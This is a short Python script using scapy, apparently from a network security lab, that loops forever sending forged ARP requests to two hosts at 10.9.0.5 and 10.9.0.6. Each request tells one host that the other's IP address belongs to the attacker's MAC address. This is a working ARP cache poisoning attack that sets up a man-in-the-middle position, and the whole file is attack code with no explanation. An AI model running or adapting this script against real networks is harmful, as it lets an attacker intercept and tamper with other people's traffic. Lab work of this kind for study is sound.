#!/usr/bin/env python3 
from scapy.all import *
import time
while(True):
	#Poison A
	E = Ether(src="02:42:0a:09:00:69", dst="02:42:0a:09:00:05")
	A = ARP(hwsrc="02:42:0a:09:00:69", psrc="10.9.0.6", hwdst="02:42:0a:09:00:05", pdst="10.9.0.5", op=1)

	pkt = E/A
	sendp(pkt)
	print("Poisoned A")
	#Poison B
	E = Ether(src="02:42:0a:09:00:69", dst="02:42:0a:09:00:06")
	A = ARP(hwsrc="02:42:0a:09:00:69", psrc="10.9.0.5", hwdst="02:42:0a:09:00:06", pdst="10.9.0.6", op=1)

	pkt = E/A
	sendp(pkt)
	print("Poisoned B")
	time.sleep(0.5)
